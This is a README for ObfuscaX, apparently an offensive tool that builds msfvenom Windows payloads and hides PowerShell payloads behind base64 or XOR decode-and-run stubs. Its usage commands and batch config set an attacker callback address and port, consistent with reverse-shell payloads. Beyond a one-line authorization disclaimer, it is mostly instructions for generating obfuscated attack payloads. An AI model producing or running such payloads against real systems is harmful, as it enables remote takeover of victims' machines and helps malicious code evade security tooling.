# ObfuscaX - Payload Obfuscation Framework

ObfuscaX generates Windows payloads with msfvenom and wraps PowerShell payloads in a small obfuscation layer. Use it only on systems you are authorized to test.

## Install

Python 3.8+. There are no third-party packages.

```bash
git clone https://github.com/blueiewu/ObfuscaX.git
cd ObfuscaX
python -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate
```

msfvenom is optional. Without `--msfvenom`, the tool writes a dummy payload.

## Usage

Generate a PowerShell payload:

```bash
python src/obfuscator.py --generate --type ps1 \
  --lhost 192.168.1.10 --lport 4444 \
  --obf dynamic --output payload.ps1
```

Generate a raw EXE payload:

```bash
python src/obfuscator.py --generate --type exe --msfvenom \
  --lhost 192.168.1.10 --lport 4444 \
  --output payload.exe
```

Run a batch:

```bash
python src/obfuscator.py --batch config.json
```

## Obfuscation modes

| Mode | Applies to | What it does |
|------|------------|--------------|
| `static` | ps1 | Base64/UTF-16LE wrapper with junk PowerShell lines |
| `dynamic` | ps1 | XOR + base64 with a small decode-and-run stub |
| `none` | ps1, exe | No obfuscation |

`ps1` defaults to `static`. `exe` defaults to `none`; msfvenom output is saved as-is.

`dynamic` uses a random XOR key unless you pass `--xor-key 1-255`. The key is embedded in the generated stub.

## Batch config

```json
{
  "jobs": [
    {
      "type": "ps1",
      "lhost": "192.168.1.10",
      "lport": 4444,
      "obf": "dynamic",
      "xor_key": 77,
      "msfvenom": true,
      "output": "payload.ps1"
    }
  ]
}
```

Each job needs `type` and `output`. Optional keys: `lhost`, `lport`, `obf`, `xor_key`, `msfvenom`. A failed job is logged and the rest still run.

## Tests

```bash
python -m unittest discover tests
```

## License

MIT. See `LICENSE`.
